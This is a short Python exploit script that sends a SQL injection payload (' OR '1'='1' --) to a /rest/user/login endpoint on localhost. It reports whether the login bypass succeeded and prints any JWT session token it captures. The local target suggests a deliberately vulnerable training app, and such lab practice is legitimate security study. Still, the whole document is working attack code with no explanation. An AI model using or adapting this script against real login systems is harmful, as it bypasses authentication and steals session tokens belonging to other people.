#!/usr/bin/env python3
"""
SQL Injection - Login Bypass
Target: /rest/user/login
Payload: ' OR '1'='1' --
"""
import requests
import sys

BASE_URL = "http://localhost:3000"
LOGIN_ENDPOINT = f"{BASE_URL}/rest/user/login"

# SQL Injection payload for login bypass
payload = {
    "email": "' OR '1'='1' --",
    "password": "anything"
}

print(f"[*] Target: {LOGIN_ENDPOINT}")
print(f"[*] Payload: {payload['email']}")

response = requests.post(LOGIN_ENDPOINT, json=payload)
print(f"[*] Status: {response.status_code}")
print(f"[*] Response: {response.text}")

if response.status_code == 200 and "authentication" in response.text.lower():
    print("[+] SUCCESS: Login bypass achieved!")
    # Extract token if present
    try:
        token = response.json().get("authentication", {}).get("token")
        if token:
            print(f"[+] JWT Token: {token}")
    except:
        pass
    sys.exit(0)
else:
    print("[-] FAILED: Login bypass did not work")
    sys.exit(1)